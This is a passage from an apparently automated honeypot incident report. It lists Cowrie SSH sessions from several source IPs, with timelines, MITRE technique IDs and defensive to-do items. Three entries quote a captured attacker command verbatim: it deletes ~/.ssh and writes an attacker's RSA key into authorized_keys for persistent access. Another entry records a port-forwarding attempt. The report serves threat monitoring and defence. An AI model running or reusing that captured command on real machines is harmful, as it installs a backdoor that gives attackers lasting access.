**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:59:55` | `cowrie.session.connect` |
| `2026-09-29 04:59:55` | `cowrie.login.success` |
| `2026-09-29 04:59:56` | `cowrie.session.params` |
| `2026-09-29 04:59:56` | `cowrie.command.input` |
| `2026-09-29 04:59:56` | `cowrie.command.failed` |
| `2026-09-29 05:00:01` | `cowrie.log.closed` |
| `2026-09-29 05:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.7[.]176` to AbuseIPDB if not already reported
- [ ] Block `207.175.7[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c46636cfdf6e

| Field | Detail |
|---|---|
| **Source IP** | `207.175.7[.]176` |
| **First Seen** | 2026-09-29 04:59 |
| **Last Seen** | 2026-09-29 05:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 04:59:57` | `cowrie.session.connect` |
| `2026-09-29 04:59:57` | `cowrie.login.success` |
| `2026-09-29 04:59:58` | `cowrie.session.params` |
| `2026-09-29 04:59:58` | `cowrie.command.input` |
| `2026-09-29 05:00:01` | `cowrie.log.closed` |
| `2026-09-29 05:00:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.7[.]176` to AbuseIPDB if not already reported
- [ ] Block `207.175.7[.]176` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e69d2192bedc

| Field | Detail |
|---|---|
| **Source IP** | `200.37.103[.]36` |
| **First Seen** | 2026-09-29 05:06 |
| **Last Seen** | 2026-09-29 05:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:06:05` | `cowrie.session.connect` |
| `2026-09-29 05:06:05` | `cowrie.client.version` |
| `2026-09-29 05:06:06` | `cowrie.client.kex` |
| `2026-09-29 05:06:06` | `cowrie.login.success` |
| `2026-09-29 05:06:07` | `cowrie.session.params` |
| `2026-09-29 05:06:07` | `cowrie.command.input` |
| `2026-09-29 05:06:07` | `cowrie.command.failed` |
| `2026-09-29 05:06:07` | `cowrie.log.closed` |
| `2026-09-29 05:06:08` | `cowrie.session.params` |
| `2026-09-29 05:06:08` | `cowrie.command.input` |
| `2026-09-29 05:06:08` | `cowrie.session.file_download` |
| `2026-09-29 05:06:08` | `cowrie.log.closed` |
| `2026-09-29 05:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.103[.]36` to AbuseIPDB if not already reported
- [ ] Block `200.37.103[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ba43e1e6246

| Field | Detail |
|---|---|
| **Source IP** | `200.37.103[.]36` |
| **First Seen** | 2026-09-29 05:06 |
| **Last Seen** | 2026-09-29 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:06:08` | `cowrie.session.connect` |
| `2026-09-29 05:06:08` | `cowrie.client.version` |
| `2026-09-29 05:06:08` | `cowrie.client.kex` |
| `2026-09-29 05:06:08` | `cowrie.login.success` |
| `2026-09-29 05:06:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.103[.]36` to AbuseIPDB if not already reported
- [ ] Block `200.37.103[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8bcc4d9762e1

| Field | Detail |
|---|---|
| **Source IP** | `200.37.103[.]36` |
| **First Seen** | 2026-09-29 05:06 |
| **Last Seen** | 2026-09-29 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:06:08` | `cowrie.session.connect` |
| `2026-09-29 05:06:08` | `cowrie.client.version` |
| `2026-09-29 05:06:09` | `cowrie.client.kex` |
| `2026-09-29 05:06:09` | `cowrie.login.success` |
| `2026-09-29 05:06:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.103[.]36` to AbuseIPDB if not already reported
- [ ] Block `200.37.103[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8b682460b33

| Field | Detail |
|---|---|
| **Source IP** | `50.6.250[.]47` |
| **First Seen** | 2026-09-29 05:27 |
| **Last Seen** | 2026-09-29 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:27:28` | `cowrie.session.connect` |
| `2026-09-29 05:27:28` | `cowrie.client.version` |
| `2026-09-29 05:27:28` | `cowrie.client.kex` |
| `2026-09-29 05:27:28` | `cowrie.login.success` |
| `2026-09-29 05:27:29` | `cowrie.session.params` |
| `2026-09-29 05:27:29` | `cowrie.command.input` |
| `2026-09-29 05:27:29` | `cowrie.command.failed` |
| `2026-09-29 05:27:29` | `cowrie.log.closed` |
| `2026-09-29 05:27:29` | `cowrie.session.params` |
| `2026-09-29 05:27:29` | `cowrie.command.input` |
| `2026-09-29 05:27:29` | `cowrie.session.file_download` |
| `2026-09-29 05:27:29` | `cowrie.log.closed` |
| `2026-09-29 05:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.250[.]47` to AbuseIPDB if not already reported
- [ ] Block `50.6.250[.]47` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db0b3df57384

| Field | Detail |
|---|---|
| **Source IP** | `50.6.250[.]47` |
| **First Seen** | 2026-09-29 05:27 |
| **Last Seen** | 2026-09-29 05:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:27:29` | `cowrie.session.connect` |
| `2026-09-29 05:27:29` | `cowrie.client.version` |
| `2026-09-29 05:27:29` | `cowrie.client.kex` |
| `2026-09-29 05:27:29` | `cowrie.login.success` |
| `2026-09-29 05:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.250[.]47` to AbuseIPDB if not already reported
- [ ] Block `50.6.250[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b639d049f9f0

| Field | Detail |
|---|---|
| **Source IP** | `50.6.250[.]47` |
| **First Seen** | 2026-09-29 05:27 |
| **Last Seen** | 2026-09-29 05:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:27:29` | `cowrie.session.connect` |
| `2026-09-29 05:27:29` | `cowrie.client.version` |
| `2026-09-29 05:27:29` | `cowrie.client.kex` |
| `2026-09-29 05:27:29` | `cowrie.login.success` |
| `2026-09-29 05:27:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.6.250[.]47` to AbuseIPDB if not already reported
- [ ] Block `50.6.250[.]47` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38150776e044

| Field | Detail |
|---|---|
| **Source IP** | `41.89.96[.]242` |
| **First Seen** | 2026-09-29 05:28 |
| **Last Seen** | 2026-09-29 05:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:28:47` | `cowrie.session.connect` |
| `2026-09-29 05:28:47` | `cowrie.client.version` |
| `2026-09-29 05:28:47` | `cowrie.client.kex` |
| `2026-09-29 05:28:48` | `cowrie.login.success` |
| `2026-09-29 05:28:49` | `cowrie.session.params` |
| `2026-09-29 05:28:49` | `cowrie.command.input` |
| `2026-09-29 05:28:49` | `cowrie.command.failed` |
| `2026-09-29 05:28:50` | `cowrie.log.closed` |
| `2026-09-29 05:28:50` | `cowrie.session.params` |
| `2026-09-29 05:28:50` | `cowrie.command.input` |
| `2026-09-29 05:28:51` | `cowrie.session.file_download` |
| `2026-09-29 05:28:51` | `cowrie.log.closed` |
| `2026-09-29 05:28:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.89.96[.]242` to AbuseIPDB if not already reported
- [ ] Block `41.89.96[.]242` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1083d4c65f7f

| Field | Detail |
|---|---|
| **Source IP** | `41.89.96[.]242` |
| **First Seen** | 2026-09-29 05:28 |
| **Last Seen** | 2026-09-29 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:28:51` | `cowrie.session.connect` |
| `2026-09-29 05:28:51` | `cowrie.client.version` |
| `2026-09-29 05:28:51` | `cowrie.client.kex` |
| `2026-09-29 05:28:52` | `cowrie.login.success` |
| `2026-09-29 05:28:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.89.96[.]242` to AbuseIPDB if not already reported
- [ ] Block `41.89.96[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-375be8f0a5ec

| Field | Detail |
|---|---|
| **Source IP** | `41.89.96[.]242` |
| **First Seen** | 2026-09-29 05:28 |
| **Last Seen** | 2026-09-29 05:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:28:52` | `cowrie.session.connect` |
| `2026-09-29 05:28:52` | `cowrie.client.version` |
| `2026-09-29 05:28:53` | `cowrie.client.kex` |
| `2026-09-29 05:28:54` | `cowrie.login.success` |
| `2026-09-29 05:28:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.89.96[.]242` to AbuseIPDB if not already reported
- [ ] Block `41.89.96[.]242` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5cf078e6a03

| Field | Detail |
|---|---|
| **Source IP** | `35.189.218[.]52` |
| **First Seen** | 2026-09-29 05:35 |
| **Last Seen** | 2026-09-29 05:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:35:56` | `cowrie.session.connect` |
| `2026-09-29 05:35:56` | `cowrie.login.success` |
| `2026-09-29 05:35:57` | `cowrie.session.params` |
| `2026-09-29 05:35:57` | `cowrie.command.input` |
| `2026-09-29 05:35:57` | `cowrie.command.input` |
| `2026-09-29 05:35:57` | `cowrie.command.failed` |
| `2026-09-29 05:35:57` | `cowrie.command.input` |
| `2026-09-29 05:35:57` | `cowrie.log.closed` |
| `2026-09-29 05:35:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.189.218[.]52` to AbuseIPDB if not already reported
- [ ] Block `35.189.218[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a70e83251c79

| Field | Detail |
|---|---|
| **Source IP** | `35.189.218[.]52` |
| **First Seen** | 2026-09-29 05:36 |
| **Last Seen** | 2026-09-29 05:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:36:10` | `cowrie.session.connect` |
| `2026-09-29 05:36:10` | `cowrie.login.success` |
| `2026-09-29 05:36:10` | `cowrie.session.params` |
| `2026-09-29 05:36:10` | `cowrie.command.input` |
| `2026-09-29 05:36:10` | `cowrie.command.failed` |
| `2026-09-29 05:36:13` | `cowrie.log.closed` |
| `2026-09-29 05:36:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.189.218[.]52` to AbuseIPDB if not already reported
- [ ] Block `35.189.218[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-148262901a81

| Field | Detail |
|---|---|
| **Source IP** | `65.49.1[.]108` |
| **First Seen** | 2026-09-29 05:36 |
| **Last Seen** | 2026-09-29 05:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.160 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:36:11` | `cowrie.session.connect` |
| `2026-09-29 05:36:11` | `cowrie.login.success` |
| `2026-09-29 05:36:11` | `cowrie.session.params` |
| `2026-09-29 05:36:11` | `cowrie.command.input` |
| `2026-09-29 05:36:11` | `cowrie.command.input` |
| `2026-09-29 05:36:11` | `cowrie.command.failed` |
| `2026-09-29 05:36:11` | `cowrie.command.input` |
| `2026-09-29 05:36:11` | `cowrie.command.failed` |
| `2026-09-29 05:36:11` | `cowrie.command.input` |
| `2026-09-29 05:36:11` | `cowrie.log.closed` |
| `2026-09-29 05:36:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.49.1[.]108` to AbuseIPDB if not already reported
- [ ] Block `65.49.1[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3888bc816306

| Field | Detail |
|---|---|
| **Source IP** | `35.189.218[.]52` |
| **First Seen** | 2026-09-29 05:36 |
| **Last Seen** | 2026-09-29 05:36 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:36:12` | `cowrie.session.connect` |
| `2026-09-29 05:36:12` | `cowrie.login.success` |
| `2026-09-29 05:36:13` | `cowrie.session.params` |
| `2026-09-29 05:36:13` | `cowrie.command.input` |
| `2026-09-29 05:36:28` | `cowrie.log.closed` |
| `2026-09-29 05:36:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.189.218[.]52` to AbuseIPDB if not already reported
- [ ] Block `35.189.218[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1164bc989f0a

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-29 05:39 |
| **Last Seen** | 2026-09-29 05:39 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:39:34` | `cowrie.session.connect` |
| `2026-09-29 05:39:34` | `cowrie.client.version` |
| `2026-09-29 05:39:34` | `cowrie.client.kex` |
| `2026-09-29 05:39:34` | `cowrie.login.success` |
| `2026-09-29 05:39:34` | `cowrie.direct-tcpip.request` |
| `2026-09-29 05:39:34` | `cowrie.direct-tcpip.data` |
| `2026-09-29 05:39:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e459600f17f8

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:40 |
| **Last Seen** | 2026-09-29 05:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:40:24` | `cowrie.session.connect` |
| `2026-09-29 05:40:24` | `cowrie.client.version` |
| `2026-09-29 05:40:24` | `cowrie.client.kex` |
| `2026-09-29 05:40:25` | `cowrie.login.success` |
| `2026-09-29 05:40:28` | `cowrie.session.params` |
| `2026-09-29 05:40:28` | `cowrie.command.input` |
| `2026-09-29 05:40:28` | `cowrie.log.closed` |
| `2026-09-29 05:40:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d53e505f8f46

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:40 |
| **Last Seen** | 2026-09-29 05:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:40:31` | `cowrie.session.connect` |
| `2026-09-29 05:40:31` | `cowrie.client.version` |
| `2026-09-29 05:40:31` | `cowrie.client.kex` |
| `2026-09-29 05:40:32` | `cowrie.login.success` |
| `2026-09-29 05:40:33` | `cowrie.session.params` |
| `2026-09-29 05:40:33` | `cowrie.command.input` |
| `2026-09-29 05:40:34` | `cowrie.log.closed` |
| `2026-09-29 05:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22306e639c04

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:40 |
| **Last Seen** | 2026-09-29 05:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:40:34` | `cowrie.session.connect` |
| `2026-09-29 05:40:34` | `cowrie.client.version` |
| `2026-09-29 05:40:34` | `cowrie.client.kex` |
| `2026-09-29 05:40:36` | `cowrie.login.success` |
| `2026-09-29 05:40:38` | `cowrie.session.params` |
| `2026-09-29 05:40:38` | `cowrie.command.input` |
| `2026-09-29 05:40:40` | `cowrie.log.closed` |
| `2026-09-29 05:40:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8169db024fcd

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:40 |
| **Last Seen** | 2026-09-29 05:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:40:51` | `cowrie.session.connect` |
| `2026-09-29 05:40:51` | `cowrie.client.version` |
| `2026-09-29 05:40:52` | `cowrie.client.kex` |
| `2026-09-29 05:40:53` | `cowrie.login.success` |
| `2026-09-29 05:40:55` | `cowrie.session.params` |
| `2026-09-29 05:40:55` | `cowrie.command.input` |
| `2026-09-29 05:40:55` | `cowrie.log.closed` |
| `2026-09-29 05:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84b73f060fce

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:40 |
| **Last Seen** | 2026-09-29 05:40 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:40:55` | `cowrie.session.connect` |
| `2026-09-29 05:40:55` | `cowrie.client.version` |
| `2026-09-29 05:40:56` | `cowrie.client.kex` |
| `2026-09-29 05:40:56` | `cowrie.login.success` |
| `2026-09-29 05:40:58` | `cowrie.session.params` |
| `2026-09-29 05:40:58` | `cowrie.command.input` |
| `2026-09-29 05:40:58` | `cowrie.log.closed` |
| `2026-09-29 05:40:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d385f4c41ef6

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:40 |
| **Last Seen** | 2026-09-29 05:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:40:58` | `cowrie.session.connect` |
| `2026-09-29 05:40:59` | `cowrie.client.version` |
| `2026-09-29 05:40:59` | `cowrie.client.kex` |
| `2026-09-29 05:41:01` | `cowrie.login.success` |
| `2026-09-29 05:41:03` | `cowrie.session.params` |
| `2026-09-29 05:41:03` | `cowrie.command.input` |
| `2026-09-29 05:41:03` | `cowrie.log.closed` |
| `2026-09-29 05:41:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9f6b993852

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:41 |
| **Last Seen** | 2026-09-29 05:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:41:03` | `cowrie.session.connect` |
| `2026-09-29 05:41:03` | `cowrie.client.version` |
| `2026-09-29 05:41:03` | `cowrie.client.kex` |
| `2026-09-29 05:41:04` | `cowrie.login.success` |
| `2026-09-29 05:41:05` | `cowrie.session.params` |
| `2026-09-29 05:41:05` | `cowrie.command.input` |
| `2026-09-29 05:41:05` | `cowrie.log.closed` |
| `2026-09-29 05:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c69d4cc33955

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-29 05:41 |
| **Last Seen** | 2026-09-29 05:41 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `hostname` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-29 05:41:08` | `cowrie.session.connect` |
| `2026-09-29 05:41:09` | `cowrie.client.version` |
| `2026-09-29 05:41:09` | `cowrie.client.kex` |
| `2026-09-29 05:41:10` | `cowrie.login.success` |
| `2026-09-29 05:41:11` | `cowrie.session.params` |
| `2026-09-29 05:41:11` | `cowrie.command.input` |
| `2026-09-29 05:41:12` | `cowrie.log.closed` |
| `2026-09-29 05:41:12` | `cowrie.session.closed` |

**Recommended Actions:**
